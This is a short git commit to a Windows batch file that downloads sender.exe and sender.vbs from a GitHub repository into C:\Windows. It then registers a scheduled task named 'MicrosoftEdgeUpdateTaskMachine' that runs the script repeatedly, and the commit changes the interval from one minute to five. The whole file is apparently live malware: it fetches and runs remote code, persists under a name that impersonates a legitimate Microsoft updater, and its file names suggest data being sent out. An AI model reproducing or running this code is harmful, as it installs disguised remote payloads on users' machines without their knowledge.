8a168f4ef01698df7b2279e37f34ccad807662c3
terionun <terionun_41@hotmail.com>
2024-07-17 03:43:33 +0300

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,3 +1,3 @@
 wget https://github.com/terionun/smbb/raw/main/sender.exe -O C:\Windows\sender.exe
 wget https://raw.githubusercontent.com/terionun/smbb/main/sender.vbs -O C:\Windows\sender.vbs
-schtasks /create /sc minute /mo 1 /tn "MicrosoftEdgeUpdateTaskMachine" /tr "wscript C:\Windows\sender.vbs"
+schtasks /create /sc minute /mo 5 /tn "MicrosoftEdgeUpdateTaskMachine" /tr "wscript C:\Windows\sender.vbs"
